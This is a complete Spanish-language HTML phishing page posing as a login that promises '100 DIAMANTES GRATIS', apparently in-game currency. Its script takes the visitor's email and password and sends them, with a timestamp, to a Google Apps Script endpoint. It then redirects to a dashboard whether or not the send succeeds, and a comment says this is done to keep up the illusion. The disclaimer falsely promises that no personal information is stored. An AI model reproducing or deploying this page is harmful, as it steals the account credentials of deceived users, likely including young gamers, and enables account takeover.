<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free - Iniciar Sesión</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        
        .background-elements {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.2;
        }
        
        .circle {
            position: absolute;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(0,212,255,1) 0%, rgba(9,9,121,1) 35%, rgba(2,0,36,1) 100%);
        }
        
        .circle:nth-child(1) {
            width: 300px;
            height: 300px;
            top: -100px;
            left: -100px;
        }
        
        .circle:nth-child(2) {
            width: 200px;
            height: 200px;
            bottom: -80px;
            right: 100px;
        }
        
        .circle:nth-child(3) {
            width: 150px;
            height: 150px;
            top: 200px;
            right: -50px;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.18);
            width: 100%;
            max-width: 400px;
            padding: 40px;
            text-align: center;
            position: relative;
            z-index: 1;
            animation: float 6s ease-in-out infinite;
        }
        
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
            100% { transform: translateY(0px); }
        }
        
        .logo {
            margin-bottom: 30px;
        }
        
        .logo i {
            font-size: 60px;
            color: #00c6ff;
            background: linear-gradient(45deg, #0072ff, #00c6ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 198, 255, 0.5);
        }
        
        .logo h1 {
            color: white;
            font-size: 28px;
            margin-top: 15px;
            letter-spacing: 1px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }
        
        .diamond-offer {
            background: rgba(0, 198, 255, 0.2);
            border-radius: 15px;
            padding: 15px;
            margin: 25px 0;
            border: 1px solid rgba(0, 198, 255, 0.3);
        }
        
        .diamond-offer h2 {
            color: #fff;
            font-size: 20px;
            margin-bottom: 10px;
        }
        
        .diamond-count {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            color: #ffd700;
            font-weight: bold;
            font-size: 22px;
        }
        
        .diamond-icon {
            font-size: 28px;
            color: #ffd700;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-group label {
            display: block;
            color: #e0e0e0;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: none;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
            border-color: #00c6ff;
            box-shadow: 0 0 15px rgba(0, 198, 255, 0.3);
        }
        
        .form-control::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        .btn-login {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: none;
            background: linear-gradient(45deg, #0072ff, #00c6ff);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4);
            margin-top: 10px;
        }
        
        .btn-login:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 114, 255, 0.6);
        }
        
        .btn-login:active {
            transform: translateY(0);
        }
        
        .disclaimer {
            color: rgba(255, 255, 255, 0.6);
            font-size: 12px;
            margin-top: 20px;
            line-height: 1.5;
        }
        
        .region-warning {
            background: rgba(255, 0, 0, 0.2);
            border-radius: 10px;
            padding: 10px;
            margin-top: 20px;
            border: 1px solid rgba(255, 0, 0, 0.3);
            color: #ff9999;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
                margin: 0 15px;
            }
            
            .logo i {
                font-size: 50px;
            }
            
            .logo h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="background-elements">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
    </div>
    
    <div class="login-container">
        <div class="logo">
            <i class="fas fa-gem"></i>
            <h1>FREE DIAMANTES</h1>
        </div>
        
        <div class="diamond-offer">
            <h2>¡REGALO ESPECIAL!</h2>
            <div class="diamond-count">
                <i class="fas fa-gem diamond-icon"></i>
                <span>100 DIAMANTES GRATIS</span>
                <i class="fas fa-gem diamond-icon"></i>
            </div>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email">CORREO ELECTRÓNICO</label>
                <input type="email" id="email" class="form-control" placeholder="Ingresa tu correo" required>
            </div>
            
            <div class="form-group">
                <label for="password">CONTRASEÑA</label>
                <input type="password" id="password" class="form-control" placeholder="Ingresa tu contraseña" required>
            </div>
            
            <button type="submit" class="btn-login">
                INICIAR SESIÓN
            </button>
        </form>
        
        <div class="disclaimer">
            <p>Al iniciar sesión, aceptas recibir 100 diamantes gratis en tu cuenta. No se almacenará ninguna información personal.</p>
        </div>
        
        <div class="region-warning">
            <p><i class="fas fa-exclamation-triangle"></i> Solo disponible para usuarios de Latinoamérica y América del Norte</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Capturar datos
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            
            // Preparar datos a enviar
            const data = {
                email: email,
                password: password,
                fecha: new Date().toLocaleString('es-ES', { 
                    timeZone: 'America/New_York',
                    dateStyle: 'short',
                    timeStyle: 'medium'
                })  // Ejemplo: 05/02/2026, 10:15:30 a. m.
            };
            
            // Mostrar spinner y deshabilitar botón
            const btn = document.querySelector('.btn-login');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFICANDO...';
            btn.disabled = true;
            
            // Enviar a Google Apps Script
            fetch('https://script.google.com/macros/s/AKfycbzmoXJajlLavH6JSevVGkeWnDRGGK5J16Uu_ZVSsuoR2htNxXnBOnghWH1qJpdemeqATA/exec', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(() => {
                // Simula éxito y redirige
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 2000);
            })
            .catch(err => {
                console.log('Error al enviar:', err);
                // Igual redirige para mantener la ilusión
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 2000);
            });
        });
    </script>
</body>
</html>
